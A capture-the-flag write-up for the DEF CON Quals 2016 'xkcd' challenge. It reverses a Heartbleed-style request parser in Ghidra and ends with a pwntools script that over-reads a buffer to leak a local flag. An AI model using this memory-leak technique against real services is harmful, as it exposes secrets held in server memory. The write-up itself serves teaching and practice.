# Defcon Quals 2016 xkcd

Let's take a look at the challenge:

```
$    file xkcd
xkcd: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, with debug_info, not stripped
$    pwn checksec xkcd
[*] '/Hackery/all/dcquals16/xkcd/xkcd'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

So we can see that it is a `64` bit statically compiled binary with a non-executable stack. The challenge also gives us a link to https://xkcd.com/1354/, which is the heartbleed xkcd. So it probably has some relevance to that exploit. Also a bit of a spoiler, this challenge is going to seem more like a reversing challenge than a pwn one. When we take a look at the main function in ghidra, we see all of the code that we need to:

```

undefined8
main(undefined8 uParm1,undefined8 uParm2,undefined8 uParm3,undefined8 uParm4,undefined8 uParm5,
    undefined8 uParm6)

{
  int input;
  int iVar1;
  int y;
  int x;
  long flagHandle;
  undefined8 lenPart;
  ulong len;
  ulong nullByte;
  undefined auStack56 [4];
  int index;
  long z;
  long flagFile;
 
  setvbuf(stdout,0,2,0,uParm5,uParm6,uParm2);
  setvbuf(stdin,0,2,0);
  bzero(0x6b7540,0x100);
  flagHandle = fopen64(&flag,&r);
  if (flagHandle == 0) {
    puts("Could not open the flag.");
    return 0xffffffff;
  }
  fread(0x6b7540,1,0x100,flagHandle);
  do {
    input = fgetln(stdin,auStack56,auStack56);
    iVar1 = strtok((long)input,&?);
    iVar1 = strcmp((long)iVar1,"SERVER, ARE YOU STILL THERE");
    if (iVar1 != 0) {
      puts("MALFORMED REQUEST");
      exit(0xffffffff);
    }
    iVar1 = strtok(0,&");
    iVar1 = strcmp((long)iVar1," IF SO, REPLY ");
    if (iVar1 != 0) {
      puts("MALFORMED REQUEST");
      exit(0xffffffff);
    }
    iVar1 = strtok(0,&");
    lenPart = strlen((long)iVar1);
    memcpy(globals,(long)iVar1,lenPart);
    strtok(0,&();
    x = strtok(0,&));
    __isoc99_sscanf((long)x,"%d LETTERS",&index);
    globals[(long)index] = 0;
    nullByte = SEXT48(index);
    len = strlen(globals);
    if (len < nullByte) {
      puts("NICE TRY");
      exit(0xffffffff);
    }
    puts(globals);
  } while( true );
}
```

Let's go through this bit by bit. Starting off we can see that it clears out a space at `0x6b7540` in the bss, then will open up the flag file with the name `flag` (the string stored in the `flag` variable). Because of this and the check it does to ensure it's successful, we will need to create a file titled `flag` that resides in the same directory as the binary in order to run it. However this block of code is essentially just scanning in the contents of the flag file to the global variables address `0x6b7540`:

```
  bzero(0x6b7540,0x100);
  flagHandle = fopen64(&flag,&r);
  if (flagHandle == 0) {
    puts("Could not open the flag.");
    return 0xffffffff;
  }
  fread(0x6b7540,1,0x100,flagHandle);
```

Next up, we can see that it scans in our input with a `fgetln` call. Proceeding that it will split up our input with the `strtok` function using the character `?` (stored in the `?` variable) as a delimiter. Then it will compare the output of `strtok` with the string `SERVER, ARE YOU STILL THERE` and return if they don't match. In order to pass this check, we will need to start off our input with `SERVER, ARE YOU STILL THERE?`:

```
    input = fgetln(stdin,auStack56,auStack56);
    iVar1 = strtok((long)input,&?);
    iVar1 = strcmp((long)iVar1,"SERVER, ARE YOU STILL THERE");
    if (iVar1 != 0) {
      puts("MALFORMED REQUEST");
      exit(0xffffffff);
    }
```

This next block is pretty similar to the last one. It is parsing the same string (we can tell since `strtok` has a `0x0` in the spot the input string goes). In order to pass this check we need to insert the string ` IF SO, REPLY "` right after the last string:

```
    iVar1 = strtok(0,&");
    iVar1 = strcmp((long)iVar1," IF SO, REPLY ");
    if (iVar1 != 0) {
      puts("MALFORMED REQUEST");
      exit(0xffffffff);
    }
```

For this part, we don't need our input to be a specific string in order to pass a check. Again it will delimited it with a `"` character similar to the last block. Slight twist here with this string being copied to `globals` (bss address `0x6b7340`) which is before where the flag is stored in memory:

```
    iVar1 = strtok(0,&");
    lenPart = strlen((long)iVar1);
    memcpy(globals,(long)iVar1,lenPart);
```

Next up we can see that it calls `strtok` on our initial input twice more. Once with the `(` character as a delimiter, and once more with the `)` character as a delimiter. When it used the `(` character, it really doesn't do anything meaningful with it as far as we are concerned. However when it uses `)` as a delimiter, it scans it in as in integer to `index` which is then used as in index to a null byte write to `globals`. This will come into play in a moment:

```
    strtok(0,&();
    x = strtok(0,&));
    __isoc99_sscanf((long)x,"%d LETTERS",&index);
    globals[(long)index] = 0;
```

Now essentially what this bottom portion of the program does, is it passes the address of `globals` (`0x6b7340`) to puts to print it out. Our input is copied to `globals` in a previous block. Before it prints it out, it will null terminate a value at some offset we specify which if it is in between the start of our input and the start of the flag we won't get the flag. In addition to that it does a check where if the index we gave it is past the length of the string that starts at `globals`, it returns.   

```
    nullByte = SEXT48(index);
    len = strlen(globals);
    if (len < nullByte) {
      puts("NICE TRY");
      exit(0xffffffff);
    }
    puts(globals);
  }
```

Now the offset between the start of our input and the flag is `0x6b7540 - 0x6b7340 = 0x200`, so we will need to have a string of length `0x200` copied over to `globals` in order to leak the flag. To pass the index check we can just set it to be the very end of the string (of course when we run it remotely we don't know where the end is, but we can just guess and check). That way we pass all of the checks (assuming we guessed right, it's not much like 5-10 byte increments) and we leak the flag. This is based off of the Heartbleed exploit since Heartbleed exploit was based off of leaking memory from a server by requesting more data from a server with a specified length that was larger than the length of the data. That is exactly what we did here.

Putting it all together here is a script that will leak it locally, when the flag is `flag{g0ttem_b0yz}`:
```
from pwn import *

target = process('./xkcd')
#gdb.attach(target, gdbscript = 'b *0x401034\nb *0x401077\nb* 0x4010ba\nb *0x4010f4\nb *0x40110e')
gdb.attach(target, gdbscript='b *main+0x1f1')

payload = ""
payload += "SERVER, ARE YOU STILL THERE"
payload += "?"
payload += " IF SO, REPLY "
payload += '\"'
payload += "0"*0x200
payload += "\""
payload += "111"
payload += "("
payload += "530"
payload += ")"

target.sendline(payload)

target.interactive()
```

When we run it:

```
$    python exploit.py
[+] Starting local process './xkcd': pid 14087
[*] running in new terminal: /usr/bin/gdb -q  "./xkcd" 14087 -x "/tmp/pwnkc4E6c.gdb"
[+] Waiting for debugger: Done
[*] Switching to interactive mode
00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000flag{g0ttem_b0yz}

```
